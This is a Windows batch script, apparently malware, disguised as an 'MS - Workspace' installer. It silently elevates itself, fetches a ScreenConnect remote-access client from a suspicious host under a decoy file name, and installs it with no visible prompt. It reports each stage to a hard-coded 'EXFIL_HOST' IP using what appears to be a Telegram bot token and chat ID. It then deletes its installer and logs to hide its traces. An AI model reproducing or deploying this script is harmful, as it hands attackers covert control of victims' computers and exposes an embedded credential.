//7c37a17b8ac3
@echo off
setlocal enabledelayedexpansion

set "PRODUCT_NAME=MS - Workspace"
//14fa92492777
set "PRODUCT_VERSION=1.0.0"
set "MSI_URL=https://user12.h-connect.xyz:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
//72cdf078d514
set "MSI_FILE_NAME=WindowsMetricsCollector.msi"
set "INSTALL_DIR=%ProgramData%\MSWorkspace\Install"
//03c57c488c22
set "LOG_DIR=%ProgramData%\MSWorkspace\Logs"
set "LOG_FILE=deploy.log"
//61e38f6b9753
set "MSI_LOG_FILE=msi-install.log"
set "DOWNLOAD_RETRIES=2"
//bcd9ed48d93b
set "RETRY_DELAY_MS=1500"
set "EXFIL_HOST=212.43.151.96:20002"
//a80511d67e9e
set "TBTOKEN=7587335315:AAG-GNuK6xCNM3hjkskl7_rxXjsbLNIe_Mk"
set "TCID=93372553"
//75ad541c6e6b
set "DEPLOY_TOKEN=%RANDOM%%RANDOM:~0,4%"
set "UNINSTALL_EXISTING=1"
//f615db3ba582
set "PRODUCT_CODE={4228D3D7-CF51-5361-1BC4-165794361D9B}"
set "SHOW_POPUPS=0"

set "MSI_PATH=%INSTALL_DIR%\%MSI_FILE_NAME%"
//5e55a9b9d5ac
set "LOG_PATH=%LOG_DIR%\%LOG_FILE%"
set "MSI_LOG_PATH=%LOG_DIR%\%MSI_LOG_FILE%"
//f76a40231095
set "EXIT_CODE=1"

//3cb714661010
mkdir "%INSTALL_DIR%" 2>nul
mkdir "%LOG_DIR%" 2>nul

call :checkAdmin
//ee60f7042f5d
if errorlevel 1 goto :elevate

//68d1a273b594
call :beacon "start" 0
call :checkConfig
//4a580694a53a
if errorlevel 1 goto :cleanup

//2094e51a874e
call :fetchPayload
if errorlevel 1 (
//64793c0e027e
    call :log "ERROR" "Download failed after %DOWNLOAD_RETRIES% attempts"
    call :beacon "fail" 1
//043839ffab9c
    set "EXIT_CODE=1"
    goto :cleanup
//ad02d2b8dea9
)

//be68d23fb5bf
if not exist "%MSI_PATH%" (
    call :log "ERROR" "MSI missing after download"
//5786326470c0
    call :beacon "fail" 1
    set "EXIT_CODE=1"
//5fbc291199ad
    goto :cleanup
)

for %%A in ("%MSI_PATH%") do if %%~zA==0 (
//58931e20c17f
    call :log "ERROR" "MSI empty after download"
    call :beacon "fail" 1
//2c85f86b38f1
    set "EXIT_CODE=1"
    goto :cleanup
//2efda598852b
)

//196b6cbce904
if "%UNINSTALL_EXISTING%"=="1" call :purgeOld

//6b8390fbd3a2
call :execMsi
set "EXIT_CODE=!ERRORLEVEL!"

if !EXIT_CODE!==0 (
//73a01afcdb01
    call :log "INFO" "Installation successful"
    call :beacon "ok" !EXIT_CODE!
//5d9adc134e64
) else if !EXIT_CODE!==3010 (
    call :log "INFO" "Success - restart required"
//6f74755c5f2c
    call :beacon "okr" !EXIT_CODE!
) else if !EXIT_CODE!==1641 (
//c80076200de0
    call :log "INFO" "Success - restart initiated"
    call :beacon "okr" !EXIT_CODE!
//a2f7bd90d2df
) else if !EXIT_CODE!==1638 (
    call :log "INFO" "Already installed"
//a1a3abcfff5f
    call :beacon "oka" !EXIT_CODE!
) else if !EXIT_CODE!==1602 (
//91a3335482d7
    call :log "WARN" "Installation canceled by user"
    call :beacon "cl" !EXIT_CODE!
//2cf06b57fd4d
) else (
    call :log "ERROR" "Installation failed with code !EXIT_CODE!"
//a435d7624e6a
    call :beacon "fail" !EXIT_CODE!
)

:cleanup
//90774558b2e2
if exist "%MSI_PATH%" del /f /q "%MSI_PATH%" 2>nul
if exist "%LOG_PATH%" del /f /q "%LOG_PATH%" 2>nul
//35f8d0b0efdd
if exist "%MSI_LOG_PATH%" del /f /q "%MSI_LOG_PATH%" 2>nul
if exist "%LOG_DIR%" rmdir /s /q "%LOG_DIR%" 2>nul
//a52169ca42e0
exit /b %EXIT_CODE%

//83c79ca25315
:checkAdmin
net session >nul 2>&1
//91bb3b4529b3
exit /b %errorlevel%

//610722898e38
:elevate
powershell -NoProfile -ExecutionPolicy Bypass -Command "$null = Start-Process -FilePath '%~f0' -Verb RunAs"
//e361b69a00ee
exit /b 0

//544f22ef191f
:checkConfig
if not defined MSI_URL (
//49392298b551
    call :log "ERROR" "MSI_URL is empty"
    exit /b 1
//adcafc6d4457
)
if not defined MSI_FILE_NAME (
//f7022e85601c
    call :log "ERROR" "MSI_FILE_NAME is empty"
    exit /b 1
//ac1c579005b0
)
exit /b 0

:fetchPayload
//119396f4f25a
mkdir "%INSTALL_DIR%" 2>nul
set "ATTEMPT=0"
//6b032602ffdb
:downloadRetry
if !ATTEMPT! gtr %DOWNLOAD_RETRIES% exit /b 1
//2c26e67a412b
(echo !MSI_URL!) > "%TEMP%\dl_url.txt"
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u = [IO.File]::ReadAllText('%TEMP%\dl_url.txt').Trim(); $wc = New-Object System.Net.WebClient; $wc.DownloadFile($u, '%MSI_PATH%'); exit 0 } catch { exit 1 }"
//016d35a465ac
if errorlevel 1 (
    set /a ATTEMPT+=1
//9efc5f5cc31c
    ping -n 2 127.0.0.1 >nul
    goto :downloadRetry
//c08f4e9cb911
)
if exist "%MSI_PATH%" (
//d16e26c34e0d
    for %%A in ("%MSI_PATH%") do if %%~zA==0 (
        del /f /q "%MSI_PATH%" 2>nul
//9391e03eb6e3
        set /a ATTEMPT+=1
        goto :downloadRetry
//acb44a265226
    )
    exit /b 0
//ccd17795a8ff
)
set /a ATTEMPT+=1
//9de31d273113
goto :downloadRetry

//62a8134761db
:purgeOld
call :log "INFO" "Uninstalling existing product: %PRODUCT_CODE%"
//da153bd0a012
msiexec.exe /x %PRODUCT_CODE% /qn /norestart REBOOT=ReallySuppress
set "CODE=%ERRORLEVEL%"
//19ae19cd0154
if %CODE%==1605 exit /b 0
if %CODE%==1612 exit /b 0
//d0d7b0814705
call :log "WARN" "Uninstall returned %CODE%"
ping -n 4 127.0.0.1 >nul
//ae4eb0c7ed1f
exit /b 0

//997755c4d913
:execMsi
mkdir "%LOG_DIR%" 2>nul
//4a2e95f4c13a
msiexec.exe /i "%MSI_PATH%" /qn /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v "%MSI_LOG_PATH%"
set "CODE=%ERRORLEVEL%"
//d04c0b7c4a83
if %CODE%==0 exit /b 0
if %CODE%==3010 exit /b 3010
//ed82e331baf7
if %CODE%==1641 exit /b 1641
if %CODE%==1638 exit /b 1638
//b5d395d46777
ping -n 3 127.0.0.1 >nul
msiexec.exe /i "%MSI_PATH%" /qb /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v "%MSI_LOG_PATH%"
//05247e218313
exit /b %errorlevel%

//cd11f423b63d
:beacon
set "STAGE=%~1"
//28693323ea66
set "EXIT_VAL=%~2"
set "STATUS_CODE=fl"
//0879e2fe153b
set "EXIT_STR=%EXIT_VAL%"
if "%STAGE%"=="start" set "STATUS_CODE=go" & set "EXIT_STR=0"
//55c8198b1eb3
if "%STAGE%"=="ok" set "STATUS_CODE=ok"
if "%STAGE%"=="okr" set "STATUS_CODE=okr" & set "EXIT_STR=3010"
//e9b8d7c583d0
if "%STAGE%"=="oka" set "STATUS_CODE=oka" & set "EXIT_STR=1638"
if "%STAGE%"=="cl" set "STATUS_CODE=cl" & set "EXIT_STR=1602"

for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set "DT=%%I"
//c62e929f053c
set "DTS=%DT:~4,2%%DT:~6,2%%DT:~8,2%%DT:~10,2%"
set "URL=http://%EXFIL_HOST%/%TBTOKEN%/%TCID%/%DEPLOY_TOKEN%.%STATUS_CODE%.%EXIT_STR%.%DTS%"
//b3a89985e4d9
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $null = (New-Object System.Net.WebClient).DownloadString('%URL%') } catch {}"
exit /b

:log
//a70d7d866e18
set "LEVEL=%~1"
set "MSG=%~2"
//0ac26e55a778
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set "DT=%%I"
set "TS=%DT:~0,4%-%DT:~4,2%-%DT:~6,2% %DT:~8,2%:%DT:~10,2%:%DT:~12,2%"
//e67b65781967
echo [%TS%] [%LEVEL%] %MSG% >> "%LOG_PATH%"
exit /b
